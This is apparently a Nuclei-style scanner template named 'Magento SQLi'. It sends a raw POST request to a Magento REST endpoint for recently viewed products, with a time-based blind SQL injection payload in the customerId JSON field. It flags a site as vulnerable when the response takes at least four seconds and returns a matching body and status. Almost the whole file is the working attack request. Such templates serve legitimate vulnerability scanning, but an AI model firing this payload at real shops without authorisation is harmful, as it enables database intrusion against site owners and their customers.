id: magento-sqli

info:
  name: Magento SQLi
  author: melbadry9
  severity: critical
  description: magento SQLi
  reference: https://none
  tags: magento

requests:
- raw:
  - |
    POST /magento/rest/en/V1/homzmart/recentlyviewed/addproduct HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/json
    Content-Length: 109
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Encoding: gzip,deflate,br
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.0 Safari/537.36

    {"customerId":"0'XOR(if(now()=sysdate(),sleep(2*2),0))XOR'Z","customerType":"Guest","productId":"A.H.FU.146"}

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - "<response>true</response>"
    
  - type: status
    status:
    - 200
    
  - type: dsl
    dsl:
    - "duration>=4"
